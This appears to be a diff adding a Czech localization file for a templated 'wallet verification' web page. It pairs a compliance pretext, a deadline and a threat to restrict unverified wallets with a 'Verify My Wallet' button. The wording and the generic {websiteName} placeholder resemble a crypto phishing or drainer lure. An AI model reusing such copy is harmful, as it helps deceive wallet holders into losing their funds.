@@ -1,0 +1,31 @@
+﻿{
+    "pageTitle": "Ověření Peněženky | {websiteName}",
+    "mainTitle": "Vyžaduje se Ověření Peněženky",
+    "description1": "Pro udržení bezpečnostních standardů a dodržování předpisů nyní vyžadujeme ověření adresy peněženky pro všechny uživatele.",
+    "deadlineText": "Od {date} bude každá neověřená peněženka",
+    "restrictionText": " dočasně omezena",
+    "cooperationText": "Vážíme si vaší spolupráce při udržování bezpečnosti naší platformy.",
+    "termsText": "Souhlasím s",
+    "termsLink": "Podmínkami použití {websiteName}",
+    "verifyBtnText": "Ověřit Mou Peněženku",
+    "securityBtnText": "O Kompromitovaných Frázích",
+    "modalTitle": "Bezpečnostní Upozornění: Kompromitované Obnovovací Fráze",
+    "modalWarning": "Kritické Upozornění:",
+    "modalWarningText": "Vaše obnovovací fráze je hlavním klíčem k vaší peněžence. Nikdy ji nikomu nesdělujte a nezadávejte ji na žádném webu.",
+    "signsTitle": "Známky kompromitované fráze:",
+    "signsList": [
+        "Sdílena s někým, kdo tvrdí, že je podpora",
+        "Uložena digitálně (fotky, cloud, zprávy)",
+        "Neautorizované transakce ve vaší peněžence"
+    ],
+    "actionTitle": "Okamžité opatření vyžadováno při kompromitaci:",
+    "actionList": [
+        "Okamžitě převeďte všechny prostředky do nové bezpečné peněženky",
+        "Vygenerujte úplně novou obnovovací frázi",
+        "Nikdy nepoužívejte žádnou verzi staré fráze"
+    ],
+    "modalNote": "Poznámka: {websiteName} vás nikdy nepožádá o vaši obnovovací frázi. Tento ověřovací proces vyžaduje pouze vaši veřejnou adresu peněženky."
+} 
+
+
+
